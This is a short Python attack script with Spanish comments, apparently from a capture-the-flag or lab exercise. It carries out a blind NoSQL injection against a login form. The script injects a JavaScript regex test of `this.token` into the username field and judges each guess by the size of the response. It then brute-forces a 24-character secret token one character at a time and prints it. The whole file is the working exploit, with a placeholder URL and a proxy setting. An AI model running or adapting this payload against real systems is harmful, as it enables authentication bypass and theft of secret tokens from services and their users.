import requests
from urllib.parse import quote_plus

proxies ={"http":"http://127.0.0.1.8080"} ###### Proxy si es que lo estamos usando, de no ser así, comentar esta y quitar la línea 11

def request(r):
    a =requests.post("http://PAHT", #### url
                     headers={   
        "Content-Type":"application/x-www-form-urlencoded"
        }, 
        data="username=\"+||+this.token.match('^"+str(r)+".*')+||+\"\"%3d%3d\"//&password=test", #### data a enviar en el formulario
        proxies=proxies,
        verify=False
        )
    
    if(len(a.content)==2445):  #### cantidad de bytes de la response
        return True
    else:
        return False
    

token=""
for i in range(24):
    for c in "-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":  ### CHARSET
        if(request(token+c)==True):
            token+=c
            break

print(token)
